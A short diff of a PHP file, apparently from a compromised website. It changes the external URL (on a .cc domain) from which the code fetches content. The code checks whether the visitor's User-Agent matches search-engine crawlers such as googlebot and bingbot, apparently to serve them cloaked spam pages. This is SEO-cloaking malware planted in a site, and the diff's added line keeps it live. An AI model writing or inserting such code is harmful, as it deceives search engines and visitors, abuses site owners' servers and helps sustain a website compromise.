@@ -15,7 +15,7 @@ function smoky($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://plerkejepit.cc/lp/resjustitia.html";
+$bot = "https://plerkejepit.cc/lp/bayesian.html";
 $file = smoky($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
